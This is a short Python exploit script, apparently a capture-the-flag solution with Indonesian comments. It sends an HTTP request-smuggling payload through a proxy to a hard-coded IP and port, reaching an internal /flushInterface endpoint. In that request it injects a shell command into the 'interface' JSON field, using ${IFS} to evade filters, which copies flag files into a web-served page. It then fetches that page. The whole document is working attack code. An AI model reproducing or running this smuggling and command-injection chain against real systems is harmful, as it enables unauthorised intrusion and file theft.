import socket
import requests

host = "94.237.50.221"
port = 30245

# Payload smuggling
smuggle = (
    "POST / HTTP/1.1\r\n"
    "Host: magic-ac110002.nip.io:5000\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: 1\r\n"
    "\r\n"
    "A\r\n\r\n"
    "POST /flushInterface HTTP/1.1\r\n"
    "Host: magic-ac110002.nip.io:5000\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: 100\r\n"
    "\r\n"
    '{"interface":"eth0;cat${IFS}/flag*.txt>${IFS}/app/proxy/includes/index.html"}'
)

# Kirim payload ke proxy
print("[*] Sending smuggled payload...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(smuggle.encode())
    s.close()

# Ambil flag dari /
print("[*] Fetching flag...")
res = requests.get(f"http://{host}:{port}/")
print("[+] Flag:")
print(res.text)
